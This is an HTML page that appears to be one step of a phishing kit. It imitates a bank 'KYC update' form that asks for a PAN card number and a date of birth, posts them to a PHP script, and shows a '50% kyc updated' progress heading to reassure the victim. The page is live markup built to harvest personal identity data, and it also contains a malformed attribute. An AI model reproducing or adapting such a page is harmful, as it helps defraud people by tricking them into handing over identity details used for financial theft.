<!DOCTYPE html>
<html lang="zxx">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        #aa ,#kk ,#ggmm
        {
            width: 100%;
        }
        #ff ,#xx
        {
            width: 90%;
            margin-left: 5%;
            margin-right: 5%;
            height: 28px;
            border-width:0.5px;
            background-color: #eaeaea;
        }
        #dd ,#ww
        {
            margin-left: 5%;
            font-size: 12px;
        }
        #hh
        {
            width: 80px;
            height: 30px;
            border-color:#ff9408 ;
            border-radius:5px;
            color: white;
            background-color: #ff9408
            
            
        }
        h2{
            margin-left: 5%;
        }
    </style>
</head>
<body>
    <img src="ac.jpg" alt="" id="aa">
    <form action="6.php" method="post">
        <div class="cc">
            <p id="dd">
                Enter Pan card Number*
            </p>
        </div>
        <div class="ee">
            <input type="text" name="PAN CARD" id="ff" required="">
        </div> 
        <div class="yy">
            <p id="ww">
                Enter confirm date of birth*
            </p>
        </div>
        <div class="zz">
            <input type="date" name="DOB="xx" required="">
        </div> 
        <div class="by">
            <h2>
                50% kyc updated
            </h2>
        </div>
         <br><br>
        <div class="gg">
           <center>
            <button type="submit" id="hh"> Confirm </button>
           </center>
        </div>
        <br>
      <img src="ll3.jpeg" alt="" id="ggmm">
        <img src="cc.jpeg" alt="" id="kk">
    </form>
</body>
</html>